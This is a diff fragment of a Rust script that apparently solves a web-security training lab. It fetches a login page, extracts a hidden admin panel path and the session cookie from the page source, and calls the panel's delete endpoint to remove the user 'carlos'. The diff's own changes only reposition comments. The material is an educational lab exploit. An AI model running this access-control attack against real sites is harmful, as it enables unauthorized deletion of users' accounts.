@@ -38,21 +38,21 @@ fn main() {
     // build the client used in all subsequent requests
     let client = build_client();
 
+    // fetch /login page
     print!("{} ", "1. Fetching /login page..".white());
     io::stdout().flush();
-    // fetch /login page
     let get_login_page = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch /login page".red()));
     println!("{}", "OK".green());
 
+    // exttract the admin panel path from the source code and the session cookie
     print!(
         "{} ",
         "2. Extracting the admin panel path from the source code and the..".white()
     );
     io::stdout().flush();
-    // exttract the admin panel path from the source code and the session cookie
     let session = extract_session_cookie(get_login_page.headers()).expect(&format!(
         "{}",
         "[!] Failed to extract the session cookie".red()
@@ -64,11 +64,11 @@ fn main() {
     ));
     println!("{} => {}", "OK".green(), admin_panel_path.yellow());
 
-    print!("{} ", "3. Fetching the admin panel..".white());
-    io::stdout().flush();
     // fetch the admin panel
     // this step in not necessary in the script, you can do step 4 directly
     // it's only a must when solving the lab using the browser
+    print!("{} ", "3. Fetching the admin panel..".white());
+    io::stdout().flush();
     let admin_panel = client
         .get(format!("{url}{admin_panel_path}"))
         .header("Cookie", format!("session={session}"))
@@ -76,9 +76,9 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
     println!("{}", "OK".green());
 
+    // delete carlos
     print!("{} ", "4. Deleting carlos..".white());
     io::stdout().flush();
-    // delete carlos
     let delete_carlos = client
         .get(format!("{url}{admin_panel_path}/delete?username=carlos"))
         .header("Cookie", format!("session={session}"))
